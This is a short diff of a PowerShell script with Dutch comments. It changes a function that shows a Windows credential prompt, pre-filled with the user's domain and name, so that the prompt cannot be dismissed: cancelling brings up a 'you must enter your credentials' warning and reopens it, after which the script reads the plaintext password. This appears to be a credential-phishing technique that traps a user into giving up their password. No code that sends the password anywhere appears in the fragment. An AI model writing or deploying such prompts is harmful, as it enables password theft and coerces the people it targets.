@@ -9,7 +9,7 @@ if (Test-Path -Path $FullPath) {
     exit
 }
 
-# Functie: Vraag om gebruikersreferenties (wachtwoord mag niet leeg zijn)
+# Functie: Vraag om gebruikersreferenties (kan niet worden gesloten zonder invoer)
 function Get-Creds {
     Add-Type -AssemblyName System.Windows.Forms
     while ($true) {
@@ -19,6 +19,12 @@ function Get-Creds {
             [Environment]::UserDomainName + '\' + [Environment]::UserName, 
             ""
         )
+
+        # Als de gebruiker de prompt sluit of annuleert, heropen het venster
+        if ($cred -eq $null) {
+            [System.Windows.Forms.MessageBox]::Show("U moet uw referenties invoeren om verder te gaan.", "Verplicht", 0, 16)
+            continue
+        }
 
         $password = $cred.GetNetworkCredential().Password
 
